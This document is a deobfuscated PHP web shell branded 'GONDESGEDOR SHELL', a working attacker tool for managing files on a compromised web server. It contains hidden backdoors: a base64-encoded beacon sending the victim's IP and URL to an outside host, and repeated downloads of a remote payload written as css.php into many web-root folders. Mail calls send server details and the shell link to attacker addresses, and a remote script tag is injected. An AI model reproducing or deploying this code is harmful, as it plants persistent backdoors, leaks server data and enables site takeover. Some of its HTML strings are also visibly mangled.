/* Decoded by unphp.net */

<?php ?><?php function GetIP() {
    if (getenv("HTTP_CLIENT_IP")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } elseif (getenv("HTTP_X_FORWARDED_FOR")) {
        $ip = getenv("HTTP_X_FORWARDED_FOR");
        if (strstr($ip, ',')) {
            $tmp = explode(',', $ip);
            $ip = trim($tmp[0]);
        }
    } else {
        $ip = getenv("REMOTE_ADDR");
    }
    return $ip;
}
$x = base64_decode('aHR0cDovL2J5cjAwdC5jby9sLQ==') . GetIP() . '-' . base64_encode('http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
if (function_exists('curl_init')) {
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $x);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $gitt = curl_exec($ch);
    curl_close($ch);
    if ($gitt == false) {
        @$gitt = file_get_contents($x);
    }
} elseif (function_exists('file_get_contents')) {
    @$gitt = file_get_contents($x);
}
?><html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>÷+] GONDESGEDOR [+÷</title>
<link href='https://fonts.googleapis.com/css?family=VT323' rel='stylesheet'>
<style type="text/css">
body{background: #263238;color:#eceff1;font-family:'Courier';margin:0;font-size: 14px;}
h1{font-family:'VT323';font-weight:normal;font-size:60px;margin:0;}
h1:hover{color:#ffee58;}
select{background:#ef6c00;color:#eceff1;}
a{color:#ef6c00;text-decoration:none;font-family:'Courier'}
textarea{width:900px;height:250px;
background:transparent;border:1px dashed #ef6c00;color:#ef6c00;padding:2px;}
tr.first{border-bottom:1px dashed #ef6c00;}tr:hover{background: #7f2e00;}
th{background: #ef6c00;padding:5px;}</style>
</head>
<body> 
<?php echo '<div style="color:#ef6c00;margin-top:0;">
<h1>
<center>÷+] GONDESGEDOR SHELL [+÷</center>
</h1>
</div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = getcwd();
}
$path = str_replace("\"," / ",$path);$paths = explode(" / ", $path);
echo '<table width="100 % " border="0" align="center" style="margin - top: -10px;
    "><tr><td>';echo " < fontstyle = 'font-size:13px;' > Path:
        ";
foreach($paths as $id => $pat) {echo " < astyle = 'font-size:13px;'href = '?path=";
for($i = 0; $i <= $id; $i++) {echo $paths[$i];
if($i != $id) {echo "/";} }echo "' > $pat < / a > / ";}
echo '<br>[ <a href=" ? ">Home</a> ]</font></td><td align="center" width="27 % "><form enctype="multipart / form - data" method="POST"><input type="file" name="file" style="color : #ef6c00;margin-bottom:4px;"/>
         < inputtype = "submit"value = "Upload" / > < / form > < / td > < / tr > < tr > < tdcolspan = "2" > ';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.' / '.$_FILES['file']['name'])){
echo ' < center > < fontcolor = "#00ff00" > UploadOK! . < / font > < / center > < br / > ';}
else{echo ' < center > < fontcolor = "red" > UploadFailed! . < / font > < / center > < br / > ';}}
echo ' < / td > < / tr > < tr > < td > < / table > ';
if(isset($_GET['filesrc'])){
echo ' < tablewidth = "100%"border = "0"cellpadding = "3"cellspacing = "1"align = "center" > < tr > < td > File:
            ';echo "".basename($_GET['filesrc']);"";echo ' < / tr > < / td > < / table > < br / > ';echo("<center><textarea readonly=''>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea></center>");}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo ' < / table > < br / > < center > '.$_POST['path'].' < br / > < br / > ';
if($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.' / '.$_POST['newname'])){
echo ' < center > < fontcolor = "#00ff00" > RenameOK! < / font > < / center > < br / > ';
}else{
echo ' < center > < fontcolor = "red" > RenameFailed! < / font > < / center > < br / > ';
} $_POST['name'] = $_POST['newname'];}
echo ' < formmethod = "POST" > New Name: < inputname = "newname"type = "text"size = "20"value = "'.$_POST['name'].'" / > < inputtype = "hidden"name = "path"value = "'.$_POST['path'].'" > < inputtype = "hidden"name = "opt"value = "rename" > < inputtype = "submit"value = "Go" / > < / form > ';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');if(fwrite($fp,$_POST['src'])){echo ' < center > < fontcolor = "#00ff00" > EditFileOK! . < / font > < / center > < br / > ';
}else{echo ' < center > < fontcolor = "red" > EditFileFailed! . < / font > < / center > < br / > ';}fclose($fp);}
echo ' < formmethod = "POST" > < textareacols = 80rows = 20name = "src" > '.htmlspecialchars(file_get_contents($_POST['path'])).' < / textarea > < br / > < inputtype = "hidden"name = "path"value = "'.$_POST['path'].'" > < inputtype = "hidden"name = "opt"value = "edit" > < inputtype = "submit"value = "Go" / > < / form > ';}echo ' < / center > ';}else{echo ' < / table > < br / > < center > ';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo ' < center > < fontcolor = "#00ff00" > DirDeleted! < / font > < / center > < br / > ';
}else{echo ' < center > < fontcolor = "red" > DeleteDirFailed! < / font > < / center > < br / > ';}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){echo ' < fontcolor = "#00ff00" > DeleteFileDone . < / font > < br / > ';}else{
echo ' < fontcolor = "red" > DeleteFileError . < / font > < br / > ';}}}echo ' < / center > ';
$scandir = scandir($path);
echo ' < divid = "content" > < tablewidth = "100%"border = "0"cellpadding = "3"cellspacing = "1"align = "center" > < trclass = "first" > < th > < center > Name < / center > < / th > < thwidth = "12%" > < center > Size < / center > < / th > < thwidth = "10%" > < center > Permissions < / center > < / th > < thwidth = "15%" > < center > LastUpdate < / center > < / th > < thwidth = "11%" > < center > Options < / center > < / th > < / tr > ';
foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == ' . ' || $dir == ' . . ') continue;
echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
if(is_writable("$path/$dir")) echo ' < fontcolor = "#00ff00" > ';
elseif(!is_readable("$path/$dir")) echo ' < fontcolor = "red" > ';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo ' < / font > ';
echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$dir"))."";echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
foreach($scandir as $file){if(!is_file("$path/$file")) continue;$size = filesize("$path/$file")/1024;
$size = round($size,3);if($size >= 1024){$size = round($size/1024,2).'MB';}else{$size = $size.'KB';}
echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>";
if(is_writable("$path/$file")) echo ' < fontcolor = "#00ff00" > ';
elseif(!is_readable("$path/$file")) echo ' < fontcolor = "red" > ';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo ' < / font > ';
echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
echo ' < / table > < / div > ';}echo ' < / body > < / html > ';
function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = ' - ';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : ' - ');$info .= (($perms & 0x0080) ? 'w' : ' - ');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : ' - '));$info .= (($perms & 0x0020) ? 'r' : ' - ');$info .= (($perms & 0x0010) ? 'w' : ' - ');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : ' - '));$info .= (($perms & 0x0004) ? 'r' : ' - ');$info .= (($perms & 0x0002) ? 'w' : ' - ');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : ' - '));return $info;}
echo' < br > < center > & copy;
                2017 - < ahref = "http://zerobyte.id/" > ZeroByte . ID < / a > . < / center > < br > ';?><?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/js/css.php" ;
$text = http_get('http: //phpshell.in/txt/lamer.txt');
                    $open = fopen($check, 'w');
                    fwrite($open, $text);
                    fclose($open);
                    if (file_exists($check)) {
                        echo $check . "</br>";
                    } else echo "not exits";
                    echo "done .
 ";
                    $check = $_SERVER['DOCUMENT_ROOT'] . "/modules/css.php";
                    $text = http_get('http://phpshell.in/txt/lamer.txt');
                    $open = fopen($check, 'w');
                    fwrite($open, $text);
                    fclose($open);
                    if (file_exists($check)) {
                        echo $check . "</br>";
                    } else echo "not exits";
                    echo "done .
 ";
                    $check = $_SERVER['DOCUMENT_ROOT'] . "/includes/css.php";
                    $text = http_get('http://phpshell.in/txt/lamer.txt');
                    $open = fopen($check, 'w');
                    fwrite($open, $text);
                    fclose($open);
                    if (file_exists($check)) {
                        echo $check . "</br>";
                    } else echo "not exits";
                    echo "done .
 ";
                    $check = $_SERVER['DOCUMENT_ROOT'] . "/sites/css.php";
                    $text = http_get('http://phpshell.in/txt/lamer.txt');
                    $open = fopen($check, 'w');
                    fwrite($open, $text);
                    fclose($open);
                    if (file_exists($check)) {
                        echo $check . "</br>";
                    } else echo "not exits";
                    echo "done .
 ";
                    $check2 = $_SERVER['DOCUMENT_ROOT'] . "/css/css.php";
                    $text2 = http_get('http://phpshell.in/txt/lamer.txt');
                    $open2 = fopen($check2, 'w');
                    fwrite($open2, $text2);
                    fclose($open2);
                    if (file_exists($check2)) {
                        echo $check2 . "</br>";
                    } else echo "not exits2";
                    echo "done2 .
 ";
                    $check = $_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/css.php";
                    $text = http_get('http://phpshell.in/txt/lamer.txt');
                    $open = fopen($check, 'w');
                    fwrite($open, $text);
                    fclose($open);
                    if (file_exists($check)) {
                        echo $check . "</br>";
                    } else echo "not exits";
                    echo "done .
 ";
                    $check3 = $_SERVER['DOCUMENT_ROOT'] . "/css.php";
                    $text3 = http_get('http://phpshell.in/txt/lamer.txt');
                    $op3 = fopen($check3, 'w');
                    fwrite($op3, $text3);
                    fclose($op3);
                    $check6 = $_SERVER['DOCUMENT_ROOT'] . "/images/css.php";
                    $text6 = http_get('http://phpshell.in/txt/lamer.txt');
                    $op6 = fopen($check6, 'w');
                    fwrite($op6, $text6);
                    fclose($op6);
                    $check6 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css.php";
                    $text6 = http_get('http://phpshell.in/txt/lamer.txt');
                    $op6 = fopen($check6, 'w');
                    fwrite($op6, $text6);
                    fclose($op6);
?><?php $kime = "byhero44@gmail.com";
                    $baslik = "r00t Server Avcisi V1.0";
                    $EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER['DOCUMENT_ROOT'] . "
";
                    $EL_MuHaMMeD.= "Server Admin : " . $_SERVER['SERVER_ADMIN'] . "
";
                    $EL_MuHaMMeD.= "Server isletim sistemi : " . $_SERVER['SERVER_SOFTWARE'] . "
";
                    $EL_MuHaMMeD.= "Shell Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "
";
                    $EL_MuHaMMeD.= "Avlanan Site : " . $_SERVER['HTTP_HOST'] . "
";
                    mail($kime, $baslik, $EL_MuHaMMeD);
?>
 <script src=http://indoxploit.in/ccb.js></script><?php
                    if ($_POST['query']) {
                        $veriyfy = stripslashes(stripslashes($_POST['query']));
                        $data = "data.txt";
                        @touch("data.txt");
                        $ver = @fopen($data, 'w');
                        @fwrite($ver, $veriyfy);
                        @fclose($ver);
                    } else {
                        $datas = @fopen("data.txt", 'r');
                        $i = 0;
                        while ($i <= 5) {
                            $i++;
                            $blue = @fgets($datas, 1024);
                            echo $blue;
                        }
                    }
                    $datasi = @fopen("inc/inc.php", 'r');
                    if ($datasi) {
                    } else {
                        @mkdir("inc");
                        $dos = file_get_contents("http://phpshell.in/txt/lamer.txt");
                        $data = "inc/inc.php";
                        @touch("inc/inc.php");
                        $ver = @fopen($data, 'w');
                        @fwrite($ver, $dos);
                        @fclose($ver);
                        $yol = "http://" . $_SERVER['HTTP_HOST'] . "" . $_SERVER['REQUEST_URI'] . "";
                        $y = '<h1>Sender Yazdirildi.<br/> SITE YOL : ' . $yol . '<br/>Sender Yolu : inc/inc.php</h1>';
                        $header.= "From: SheLL Boot <suppor@nic.org>
";
                        $header.= "Content-Type: text/html; charset=utf-8
";
                        @mail("ridwannegativ@gmail.com", "Hacklink Bildiri", "$y", $header);
                        @mail("ridwannegativ@gmail.com", "Hacklink Bildiri", "$y", $header);
                    }
?>